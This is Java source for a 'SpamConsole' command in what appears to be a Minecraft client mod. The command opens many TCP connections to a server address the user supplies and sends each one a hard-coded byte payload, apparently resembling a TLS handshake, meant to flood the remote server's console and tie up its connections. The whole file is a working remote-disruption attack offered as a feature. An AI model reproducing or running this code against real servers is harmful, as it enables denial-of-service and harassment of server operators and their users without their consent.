package me.zeroX150.atomic.feature.command.impl;

import me.zeroX150.atomic.feature.command.Command;
import me.zeroX150.atomic.helper.util.Utils;

import java.io.DataOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class SpamConsole extends Command {

    static int[] PAYLOAD = new int[]{0x3, 0x1, 0x0, 0xffffffbb, 0x1, 0x0, 0x0, 0xffffffb7, 0x3, 0x3, 0xffffffcb, 0xffffff82, 0xffffffae, 0x53, 0x15, 0xfffffff6, 0x79, 0x2, 0xffffffc2, 0xb, 0xffffffe1,
            0xffffffc2, 0x6a, 0xfffffff8, 0x75, 0xffffffe9, 0x32, 0x23, 0x3c, 0x39, 0x3, 0x3f, 0xffffffa4, 0xffffffc7, 0xffffffb5, 0xffffff88, 0x50, 0x1f, 0x2e, 0x65, 0x21, 0x0, 0x0, 0x48, 0x0, 0x2f};

    public SpamConsole() {
        super("SpamConsole", "Spams the console of a server remotely", "spamconsole", "consolespam");
    }

    @Override public void onExecute(String[] args) {
        if (args.length < 2) {
            Utils.Client.sendMessage("I need you to provide a server address (ip:port) and the number of iterations (~ 50)");
            return;
        }
        String a = args[0];
        String[] addrSplit = a.split(":");
        if (addrSplit.length != 2) {
            Utils.Client.sendMessage("Invalid address");
            return;
        }
        String addr = addrSplit[0];
        String portS = addrSplit[1];
        int port = Utils.Math.tryParseInt(portS, -1);
        if (0 > port || port > 65535) {
            Utils.Client.sendMessage("Invalid port number. Valid numbers range from 0-65535");
            return;
        }
        String iterationsS = args[1];
        int iterations = Utils.Math.tryParseInt(iterationsS, -1);
        if (iterations < 0) {
            Utils.Client.sendMessage("Invalid iterations amount. has to be above 0");
            return;
        }
        Utils.Client.sendMessage("Spamming");
        new Thread(() -> {
            List<Socket> sockets = new ArrayList<>();
            for (int i = 0; i < iterations; i++) {
                try {
                    Socket s = new Socket(addr, port);
                    sockets.add(s);
                } catch (Exception ignored) {
                }
            }
            try {
                for (Socket socket : sockets) {
                    DataOutputStream outp = new DataOutputStream(socket.getOutputStream());
                    for (int i1 : PAYLOAD) {
                        outp.write(i1);
                    }
                }
            } catch (Exception ignored) {

            }
            Utils.Client.sendMessage("Done");
        }).start();

    }
}
